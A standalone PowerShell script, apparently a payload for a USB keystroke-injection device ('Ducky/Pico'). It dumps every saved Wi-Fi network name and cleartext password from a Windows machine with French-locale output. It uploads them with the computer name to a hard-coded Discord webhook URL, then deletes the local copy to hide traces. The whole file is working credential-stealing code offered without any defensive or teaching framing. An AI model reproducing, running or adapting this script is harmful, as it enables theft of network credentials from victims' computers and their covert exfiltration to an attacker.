$wifi=@()

$cmd1 = netsh wlan show profiles

ForEach($row1 in $cmd1) {
    If($row1 -match 'Profil Tous les utilisateurs[^:]+:.(.+)$') {
        $ssid = $Matches[1]
        $cmd2 = netsh wlan show profiles $ssid key=clear
        ForEach($row2 in $cmd2) {
            If($row2 -match 'Contenu de la c[^:]+:.(.+)$') {
                $key = $Matches[1]
                $wifi += [PSCustomObject]@{ssid=$ssid;key=$key}
            }
        }
    }
}

$path = $env:USERPROFILE
$wifi | Export-CSV -Path $path'\wifi.txt' -NoTypeInformation

$url = "https://discord.com/api/webhooks/1183033331475038270/5m0FRTKblJIstpVUY0UotCAv5LFnyh7TcKOZjq58PeMJsOBweDRwTuPgjBQuAruLRous"
$Body = @{
    content = "$env:computername Stats from Ducky/Pico"
    wifi = $wifi
}
Invoke-RestMethod -ContentType 'Application/Json' -Uri $url -Method Post -Body ($Body | ConvertTo-Json)
curl.exe -F "file1=@wifi.txt" $url ; 

Remove-Item $path'\wifi.txt'
